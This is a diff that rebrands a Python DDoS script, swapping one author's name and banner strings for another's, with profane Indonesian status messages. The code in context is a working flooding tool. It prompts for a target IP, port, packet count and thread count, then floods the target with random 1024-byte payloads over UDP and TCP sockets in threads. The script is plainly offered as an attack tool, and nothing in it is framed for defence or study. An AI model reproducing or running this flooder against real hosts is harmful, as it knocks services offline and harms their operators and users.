@@ -1,18 +1,17 @@
 #!/usr/bin/env python3
-#Ddos by XalBadoR
-#Join My T3Am : https://discord.gg/fRDAvXsU
+#Ddos by VinzProPler
 import random
 import socket
 import threading
 import os
 
 os.system("clear")
-print ("DDoS Mod3 XalBdor")
-print ("AUTOR : Xalbador CODE : XLBDR")
-ip = str(input(" DdosAttackByXalbador | Ip:"))
-port = int(input(" DdosAttackByXalbador | Port:"))
-choice = str(input(" DdosAttackByXalbador | Gas Gak Ni?(y/n):"))
-times = int(input(" DdosAttackByXalbador | Packets:"))
+print ("DDoS Mod By VinzProPler")
+print ("AUTOR : VINZPROPLER CODE : VNZPRP")
+ip = str(input(" DdosAttackByVinzProPler | Ip:"))
+port = int(input(" DdosAttackByVinzProPler | Port:"))
+choice = str(input(" DdosAttackByVinzProPler | Gas Gak Ni?(y/n):"))
+times = int(input(" DdosAttackByVinzProPler | Packets:"))
 threads = int(input(" DdosAttackByXalbador | Threads:"))
 def run():
 	data = random._urandom(1024)
@@ -23,7 +22,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | XalbadorX |")
+			print(i +" | VinzProPler |")
 		except:
 			print("[!] | Server down kontol!!! |")
 
@@ -37,7 +36,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Xalbador nih bos!!!")
+			print(i +" JANJI GA DOWN 😅")
 		except:
 			s.close()
 			print("[*] Down lagi kontol")
